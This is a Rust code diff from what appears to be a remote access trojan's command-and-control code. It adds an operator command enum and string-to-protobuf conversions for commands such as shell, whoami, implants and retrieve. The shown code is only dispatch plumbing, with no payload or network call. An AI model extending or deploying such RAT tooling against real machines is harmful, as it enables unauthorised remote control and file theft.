@@ -1,4 +1,4 @@
-use crate::rat::RatCommand;
+use crate::rat::{OperatorCommand, RatCommand};
 
 pub mod rat {
     tonic::include_proto!("rat");
@@ -50,6 +50,65 @@ impl From<RatCommand> for RsRatCommand {
             RatCommand::Quit => RsRatCommand::Quit,
             RatCommand::Shell => RsRatCommand::Shell,
             RatCommand::Whoami => RsRatCommand::Whoami,
+        }
+    }
+}
+
+// Hacky copy of different protobuf in rat.rs
+pub enum RsOperatorCommand {
+    OpCadence = 0,
+    OpDir = 1,
+    OpHostname = 2,
+    OpIp = 3,
+    OpLs = 4,
+    OpNone = 5,
+    OpOs = 6,
+    OpQuit = 7,
+    OpShell = 8,
+    OpWhoami = 9,
+    OpImplants = 10,
+    OpHelp = 11,
+    OpRetrieve = 12,
+}
+
+// Way to convert a string slice to the second hacky protobuf copy
+impl Into<OperatorCommand > for RsOperatorCommand {
+    fn into(self) -> OperatorCommand {
+        match self {
+            RsOperatorCommand::OpCadence => OperatorCommand::OpCadence,
+            RsOperatorCommand::OpDir => OperatorCommand::OpDir,
+            RsOperatorCommand::OpHostname => OperatorCommand::OpHostname,
+            RsOperatorCommand::OpIp => OperatorCommand::OpIp,
+            RsOperatorCommand::OpLs => OperatorCommand::OpLs,
+            RsOperatorCommand::OpOs => OperatorCommand::OpOs,
+            RsOperatorCommand::OpQuit => OperatorCommand::OpQuit,
+            RsOperatorCommand::OpShell => OperatorCommand::OpShell,
+            RsOperatorCommand::OpWhoami => OperatorCommand::OpWhoami,
+            RsOperatorCommand::OpImplants => OperatorCommand::OpImplants,
+            RsOperatorCommand::OpHelp => OperatorCommand::OpHelp,
+            RsOperatorCommand::OpRetrieve => OperatorCommand::OpRetrieve,
+            RsOperatorCommand::OpNone => OperatorCommand::OpNone,
+        }
+    }
+}
+
+// Way to convert a second hacky protobuf copy to the actual protobuf
+impl From<&str > for RsOperatorCommand {
+    fn from(in_slice: &str) -> Self {
+        match in_slice {
+            "cadence" => RsOperatorCommand::OpCadence,
+            "dir" => RsOperatorCommand::OpDir,
+            "hostname" => RsOperatorCommand::OpHostname,
+            "ip" => RsOperatorCommand::OpIp,
+            "ls" => RsOperatorCommand::OpLs,
+            "os" => RsOperatorCommand::OpOs,
+            "quit" => RsOperatorCommand::OpQuit,
+            "shell" => RsOperatorCommand::OpShell,
+            "whoami" => RsOperatorCommand::OpWhoami,
+            "implants" => RsOperatorCommand::OpImplants,
+            "help" => RsOperatorCommand::OpHelp,
+            "retrieve" => RsOperatorCommand::OpRetrieve,
+            _ => RsOperatorCommand::OpNone,
         }
     }
 }
